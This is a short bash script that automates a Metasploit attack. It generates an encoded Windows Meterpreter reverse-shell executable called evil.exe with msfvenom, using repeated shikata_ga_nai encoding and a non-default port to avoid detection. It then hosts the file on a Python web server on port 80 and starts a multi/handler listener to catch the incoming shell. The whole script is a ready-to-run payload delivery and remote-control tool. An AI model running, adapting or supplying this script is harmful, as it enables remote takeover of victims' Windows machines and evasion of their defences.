#!/bin/bash

# author:       Tay Hui Lian
# date:         06-01-2017

# assume that attack is the one generating on interface eth0
attackerip=`ifconfig eth0 | grep netmask | cut -d' ' -f10`

# avoid nmap default 1000 ports scan
attackerport=9107

echo "====> Generating evil.exe..."
echo 
#generating evil.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -b '\x00\x0a\x0d' -f exe --arch x86 --platform windows -e x86/shikata_ga_nai -i 5 > evil.exe

echo
echo "====> evil.exe generated."
echo "====> starting webserver at port 80..."

#host the file on a webserver
gnome-terminal --tab -e "python -m SimpleHTTPServer 80"
echo "====> webserver started at port 80..."
echo 
echo "====> starting metasploitable meterpreter listener..."
echo "to exit the metasploitable, use the quit command"
echo

#start up meterpreter listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $attackerip; set LPORT $attackerport; run;"

